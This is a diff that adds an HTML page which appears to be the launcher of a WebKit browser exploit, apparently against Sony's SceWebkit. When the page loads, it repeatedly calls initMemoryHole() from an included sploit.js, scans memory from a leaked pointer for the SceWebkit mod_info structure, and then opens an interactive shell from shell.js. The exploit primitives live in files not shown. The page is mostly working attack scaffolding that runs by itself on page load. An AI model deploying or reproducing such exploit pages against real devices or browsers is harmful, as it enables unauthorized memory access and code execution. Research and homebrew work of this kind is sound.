@@ -1,0 +1,47 @@
+<html>
+<body>
+<script src="inc/utils.js"></script>
+<script src="inc/jquery.min.js"></script>
+<script src="inc/sploit.js"></script>
+<script src="inc/shell.js"></script>
+<script type="text/javascript">
+
+// global vars
+var _gc, _cnt = 0;
+var leakedptr;  // will point somewhere in SceWebkit and will be used to scan forwards
+                // to find the SceWebkit mod_info
+                // will be set by initMemoryHole()
+
+/*
+   Main
+*/
+window.onload = function() {
+    try{
+        var found = 0;
+        // Try 4 times to initialize, if it doesn't work exit
+        for(var i = 0; i < 4; i++){
+            var aspace = initMemoryHole();
+            if(aspace != -1){ found = 1; break};
+        }
+
+        if(found == 0){
+            logdbg("Initialization failed");
+            return;
+        }
+
+        // Search for the SceWebkit mod_info struct
+        // starting from the leaked pointer
+        logdbg("Scanning memory for SceWebkit mod_info");
+        scan_mod_info(aspace, leakedptr);
+
+        // Interactive shell
+        shell(aspace);
+    }catch(e){
+        logdbg("MainError: " + e);
+    }
+}
+</script>
+
+<div id="log"></div>
+</body>
+</html>
